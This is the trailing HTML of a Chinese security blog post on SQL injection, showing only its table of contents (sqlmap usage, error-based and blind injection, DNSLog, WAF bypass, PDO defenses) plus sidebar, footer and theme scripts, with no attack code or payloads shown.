class="toc-text"> 5.SQLMAP 支持的注入技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6sqlmap%E6%94%AF%E6%8C%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.0.2.6.</span> <span class="toc-text"> 6.SQLMAP 支持的数据库类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7sqlmap%E7%94%A8%E6%B3%95%E4%BB%A5%E4%B8%8B%E7%94%A8windows%E6%BC%94%E7%A4%BA"><span class="toc-number">1.0.2.7.</span> <span class="toc-text"> 7.sqlmap 用法 (以下用 Windows 演示)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#71%E5%AF%B9%E4%BA%8Eget%E8%AF%B7%E6%B1%82%E7%88%86%E7%A0%B4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.2.8.</span> <span class="toc-text"> 7.1 对于 get 请求爆破方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#72%E5%AF%B9%E4%BA%8Epost%E8%AF%B7%E6%B1%82%E7%88%86%E7%A0%B4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.2.9.</span> <span class="toc-text"> 7.2 对于 post 请求爆破方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#73%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%BA%9B%E8%BE%83%E9%9A%BE%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="toc-number">1.0.2.10.</span> <span class="toc-text"> 7.3 对于一些较难注入的场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8awvs-%E8%BF%9B%E8%A1%8Csql-inject%E6%89%AB%E6%8F%8F"><span class="toc-number">1.0.3.</span> <span class="toc-text"> 使用 AWVS 进行 sql inject 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="toc-number">1.0.4.</span> <span class="toc-text"> 3.SQL 注入基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#31sql%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.0.4.1.</span> <span class="toc-text"> 3.1SQL 前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32sql%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-number">1.0.4.2.</span> <span class="toc-text"> 3.2SQL 注入定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32mysql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.4.3.</span> <span class="toc-text"> 3.2mysql 注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.0.4.3.1.</span> <span class="toc-text"> 万能密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.2.</span> <span class="toc-text"> 1. 整形注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.3.</span> <span class="toc-text"> 字符型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.4.</span> <span class="toc-text"> 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1st_latfromgeohashmysql57x"><span class="toc-number">1.0.4.3.4.1.</span> <span class="toc-text"> 1.ST_LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2st_longfromgeohashmysql57x"><span class="toc-number">1.0.4.3.4.2.</span> <span class="toc-text"> 2.ST_LongFromGeoHash（mysql&gt;&#x3D;5.7.x）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3gtid-mysql-56x-%E6%98%BE%E9%94%99200"><span class="toc-number">1.0.4.3.4.3.</span> <span class="toc-text"> 3.GTID (MySQL&gt;&#x3D; 5.6.X - 显错 &lt;&#x3D;200)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#gtid_subset-%E5%92%8C-gtid_subtract%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.4.3.4.4.</span> <span class="toc-text"> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4floor8xmysql50"><span class="toc-number">1.0.4.3.4.5.</span> <span class="toc-text"> 4.floor（8.x&gt;mysql&gt;5.0）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5st_pointfromgeohash-mysql57"><span class="toc-number">1.0.4.3.4.6.</span> <span class="toc-text"> 5.ST_Pointfromgeohash (mysql&gt;&#x3D;5.7)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-updatexml"><span class="toc-number">1.0.4.3.4.7.</span> <span class="toc-text"> 6 updatexml</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-extractvalue"><span class="toc-number">1.0.4.3.4.8.</span> <span class="toc-text"> 7 extractvalue</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.4.3.5.</span> <span class="toc-text"> 盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.6.</span> <span class="toc-text"> 搜索注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.7.</span> <span class="toc-text"> DNSLog 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8burpdnslog%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E5%85%A8%E9%83%A8%E6%95%B0%E6%8D%AE"><span class="toc-number">1.0.4.3.8.</span> <span class="toc-text"> 使用 Burp+DNSlog 快速获取全部数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dnslog%E9%85%8D%E5%92%8Csqlmap%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.9.</span> <span class="toc-text"> DNSLog 配和 Sqlmap 进行注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.10.</span> <span class="toc-text"> 二次注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9A%84ctf-game"><span class="toc-number">1.0.4.3.11.</span> <span class="toc-text"> 二次注入相关的 CTF GAME</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%A6%E6%9C%89waf%E8%BF%87%E6%BB%A4%E7%9A%84sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.12.</span> <span class="toc-text"> 带有 WAF 过滤的 SQL 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#referer%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.13.</span> <span class="toc-text"> referer 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#user-agent%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.14.</span> <span class="toc-text"> user-agent 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.15.</span> <span class="toc-text"> cookie 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.16.</span> <span class="toc-text"> post 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sql%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.17.</span> <span class="toc-text"> SQL 读写文件注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.18.</span> <span class="toc-text"> 宽字节注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hpp%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.0.4.3.19.</span> <span class="toc-text"> HPP 参数污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.20.</span> <span class="toc-text"> 堆叠注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#update-insert%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.21.</span> <span class="toc-text"> update &#x2F;insert 语句中注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#limit%E4%B8%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.3.22.</span> <span class="toc-text"> limit 中注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.5.</span> <span class="toc-text"> mysql 注入防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.0.5.1.</span> <span class="toc-text"> 通过函数过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%99%8D%E6%9D%83"><span class="toc-number">1.0.5.2.</span> <span class="toc-text"> 降权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pdo"><span class="toc-number">1.0.5.3.</span> <span class="toc-text"> 使用 PDO</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="toc-number">1.0.6.</span> <span class="toc-text"> 绕过 waf</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li class="active"><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">8</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">2</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">3</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/02/17/XSS/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/04/16/Upload/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/03/16/SQL注入/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
